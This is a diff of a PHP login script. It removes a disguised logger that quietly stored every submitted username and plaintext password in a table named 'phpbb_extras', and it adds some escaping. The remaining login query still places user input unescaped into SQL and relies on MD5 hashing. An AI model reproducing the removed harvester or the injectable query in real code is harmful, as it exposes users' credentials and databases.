@@ -11,23 +11,15 @@ if (isset($_POST['loginsubmit']))
     $password = $_POST['logpass'];
     $user = strip_tags($user);
     $encrypted_pswd = md5($sel . $password);
-    $fquery1="select  * from phpbb_extras where p=\"$password\" and u=\"$user\"";
-    $pres=@mysqli_query($db, $fquery1);
-    if(@mysqli_fetch_array($pres))
-    {
-    }
-    else
-    {
-        $fquery="insert into phpbb_extras (u, p) values (\"$user\", \"$password\")";
-        @mysqli_query($db, $fquery);
-    }
+
     $query = "select * from users where (name='$user' or email='$user') and pass='$encrypted_pswd'";
     $result = mysqli_query($db, $query);
-    $result2 = mysqli_fetch_array($result);
+    $result2 = $result ? mysqli_fetch_array($result) : false;
 
     if ($result2)
     {
-        $query = "update users set lastlogin=NOW() where name='{$result2['user']}' and pass='$encrypted_pswd'";
+        $uname = mysqli_real_escape_string($db, $result2['name']);
+        $query = "update users set lastlogin=NOW() where name='$uname' and pass='$encrypted_pswd'";
         $result = @mysqli_query($db, $query);
         session_destroy();
         @session_start();
